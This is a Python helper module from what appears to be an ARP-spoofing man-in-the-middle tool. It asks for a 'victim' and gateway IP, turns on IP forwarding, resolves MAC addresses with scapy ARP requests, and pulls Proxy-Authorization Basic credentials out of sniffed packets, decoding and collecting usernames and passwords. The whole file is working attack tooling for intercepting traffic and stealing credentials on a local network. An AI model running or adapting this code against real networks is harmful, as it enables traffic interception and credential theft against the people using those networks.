import base64
import csv
import ipaddress
import os
import re

from scapy.all import ARP, Ether, srp, Raw

from . import PROXY_USER_PASS

ARP_FILE = '/proc/net/arp'


def ip_forwarding(enable=True):
    """
    Enable/Disable IP forwarding.
    :param enable: If True, enable IP forwarding. Otherwise disable
    :return: None
    """
    if enable:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def get_ip(victim=True):
    if victim:
        input_str = "Type victim's IP address: "
    else:
        input_str = "Type gateway's IP address: "
    ip_address = input(input_str)
    try:
        ipaddress.ip_address(ip_address)
    except ValueError:
        error_str = "{} doesn't look like a valid IP".format(ip_address)
        ip_address = input(error_str + '\n' + input_str)
    return ip_address


def get_interface():
    """
    Get interface for sniffing
    :return: Interface
    """
    interfaces = os.listdir('/sys/class/net/')
    if 'lo' in interfaces:
        interfaces.remove('lo')
    global INTERFACE
    INTERFACE = input("Select interface to use {}: ".format(interfaces))


def get_arp_table():
    """
    Return IP-address and Hardware-address pairs by reading ARP table.
    :return: Cached ARP Table as list
    """
    names = ['IP address', 'HW type', 'Flags', 'HW address', 'Mask', 'Device']

    arp_reader = csv.DictReader(
        open(ARP_FILE), fieldnames=names, skipinitialspace=True, delimiter=' '
    )
    next(arp_reader)

    return [(row.get(names[0]), row.get(names[3])) for row in arp_reader]


def ip_to_mac(ip, check_arp_cache=False):
    """
    Returns the MAC address for ip.

    First check the ARP cache for MAC.
    If MAC is not found in cache, send a legitimate ARP broadcast
    request for ip.
    :param ip: IP address
    :param check_arp_cache: If True, ARP cache is checked for MAC address.
    :return: MAC address
    """
    if check_arp_cache:
        # print("Looking for MAC for {} in ARP cache".format(ip))
        # check for mac in arp table
        arp_table = get_arp_table()
        mac_address = [item[1] for item in arp_table if item[0] == ip]
        if mac_address:
            return mac_address
    # ether packet
    # default dst is ff:ff:ff:ff:ff:ff (Broadcast)
    ether = Ether()
    # ARP packet
    # hwsrc and psrc are added by default
    arp = ARP(op=ARP.who_has, pdst=ip)
    # layer2 packet
    packet = ether / arp

    # send at layer2
    ans, un_ans = srp(
        packet, timeout=2, iface=INTERFACE, inter=0.1, verbose=0)
    for s, r in ans:
        mac_address = r.sprintf(r"%Ether.src%")
        return mac_address


def get_proxy_pass(packet):
    """
    Extract proxy credentials from packet.
    :param packet: TCP Packet
    :return: None
    """
    if packet.haslayer(Raw):
        raw_load = packet.getlayer(Raw).load
        proxy = re.search(b"Proxy-Authorization: Basic (.*)\r", raw_load)
        if proxy and proxy.group(1):
            proxy_user, proxy_pass = base64.standard_b64decode(proxy.group(1)).split(':')
            PROXY_USER_PASS.add((proxy_user, proxy_pass))
    return
